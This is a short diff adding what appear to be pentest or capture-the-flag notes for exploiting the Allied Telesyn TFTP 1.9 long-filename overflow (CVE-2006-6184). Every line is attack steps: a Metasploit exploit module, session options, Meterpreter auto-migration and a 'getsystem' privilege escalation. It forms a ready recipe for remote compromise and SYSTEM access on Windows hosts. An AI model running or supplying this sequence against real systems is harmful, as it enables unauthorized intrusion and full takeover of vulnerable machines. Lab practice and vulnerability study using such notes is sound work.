@@ -1,0 +1,13 @@
+Allied Telesyn TFTP (AT-TFTP) Server/Daemon 1.9 - Long Filename Overflow - CVE-2006-6184
+
+use exploit/windows/tftp/attftp_long_filename
+
+set LHOST
+set RHOSTS
+set RPORT
+set target 10
+set AUTORUNSCRIPT post/windows/manage/migrate
+
+privesc:
+
+meterpreter > getsystem
